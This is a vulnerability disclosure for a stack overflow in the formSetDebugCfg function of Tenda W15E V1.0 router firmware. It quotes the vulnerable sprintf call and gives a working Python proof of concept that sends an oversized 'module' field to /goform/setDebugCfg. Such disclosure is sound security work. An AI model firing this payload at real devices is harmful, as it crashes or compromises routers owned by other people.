## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formSetDebugCfg` function. The `pEnable, pLevel, pModule` variable receives the `enable, level, module` parameter from a POST request. However, since the user can control the input of `enable, level, module`, the statement

```c
sprintf(
    (char *)cmd,
    "echo enable=%s level=%s > /var/debug/%s",
    (const char *)pEnable,
    (const char *)pLevel,
    (const char *)pModule);
```

can cause a buffer overflow. The user-provided  `enable, level, module` can exceed the capacity of the `cmd` array, triggering this security vulnerability.

![image-20240417093917502](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417093917502.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setDebugCfg"
payload = b"a"*2000

data = {
        'module':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
